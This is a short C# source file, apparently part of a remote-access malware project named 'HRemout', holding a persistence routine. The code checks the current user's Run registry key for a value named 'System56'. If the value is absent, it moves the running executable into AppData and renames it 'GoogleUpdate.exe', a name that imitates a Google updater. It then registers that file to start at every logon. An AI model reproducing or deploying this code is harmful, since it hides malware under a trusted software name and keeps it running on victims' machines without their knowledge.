using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace HRemout;

internal class FileStartUp
{
	private static bool IsStartupItem()
	{
		if (Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue("System56") == null)
		{
			return false;
		}
		return true;
	}

	public static void set()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (!IsStartupItem())
		{
			File.Move(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\GoogleUpdate.exe");
			registryKey.SetValue("System56", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\GoogleUpdate.exe");
		}
	}
}
